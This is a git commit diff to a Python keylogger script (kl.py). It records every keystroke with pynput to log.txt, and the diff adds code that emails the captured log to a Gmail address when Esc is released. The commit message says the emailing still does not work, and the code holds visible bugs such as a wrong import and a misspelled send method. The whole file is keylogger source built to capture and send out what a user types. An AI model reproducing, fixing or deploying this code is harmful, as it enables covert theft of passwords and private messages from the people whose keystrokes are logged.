1f21913b8f1019d17bd0884d5c930f2c30752334
Thomas Stephens <thmasssstephens@gmail.com>
2023-08-02 11:50:38 +0200

    Code gotten from 'docs.python.org/3/library/email.examples.html'. Still doesn't work.

--- kl.py
+++ kl.py
@@ -1,6 +1,8 @@
 import pyinput
 from time import ctime
 from pynput.keyboard import Key, Listener
+import smtplib
+from email.message import EmailMessage
 
 keys = []
 
@@ -24,17 +26,27 @@ def on_press(key):
 def write_file(keys):
     with open("log.txt", "a") as file:
         for key in keys:
-            k=None
             k=str(key).replace("'", "")
             if k == "Key.enter":
                 file.write('\n')
             else:
                 file.write(k + ' ')
+            k=None
 
 
 def on_release(key):
     print("{0} released".format(key))
     if key==Key.esc:
+        with open("log.txt") as f:
+            msg=EmailMessage()
+            msg.set_content(f.read())
+        msg['Subject']="Contents of KeyLogger"
+        msg['From']="devcr34@gmail.com"
+        msg['To']="devcr34@gmail.com"
+        
+        s=smtplib.SMTP('localhost')
+        s.sendmessage(msg)
+        s.quit()
         return False
 
 
